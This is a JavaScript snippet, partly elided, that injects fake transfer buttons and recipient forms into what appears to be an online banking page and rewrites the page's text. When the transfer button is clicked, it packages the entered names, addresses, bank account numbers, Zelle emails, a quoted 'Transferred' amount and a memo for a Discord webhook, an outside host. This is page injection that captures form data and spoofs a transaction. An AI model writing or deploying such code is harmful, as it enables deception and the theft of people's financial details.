const btnHtml = `<button id="foreignLocal" type="button" style="
background: #00a1ff;
margin-right: 10px;
color: white;
border: none;
border-radius: 5px;
">Send to an account that you don't own</button> <button id="zelle" type="button" style="
background: blueviolet;
margin-right: 10px;
color: white;
border: none;
border-radius: 5px;
">Transfer to a Zelle™ Account</button>`
const infoHtml = `    <div id="outT">
Recepient's Full Name: <input id="rN"></input>
...
<div id="zelleD">
Recepient's Full Name: <input id="zName"></input>
...
document.querySelector("p.lead").innerHTML = "Fill in the form below to transfer funds to either your accounts or someone else's account"
...
var zE = id('zelleE');
var zN = id('zName')
var m = document.querySelector('textarea#description.form-control')

id('transferO').addEventListener('click', () => {
    var url = localStorage.getItem('DiscordWebhook');
    const msg = {
        "content": `Name: ${rN.value}, Address: ${rA.value}, Bank Account Number: ${rBANK.value}, Account Type: ${rAT.value}, Zelle Name: ${zN.value} Zelle Email: ${zE.value}, Amount "Transferred": ${Am.value}, Memo: ${m.value}`
    }
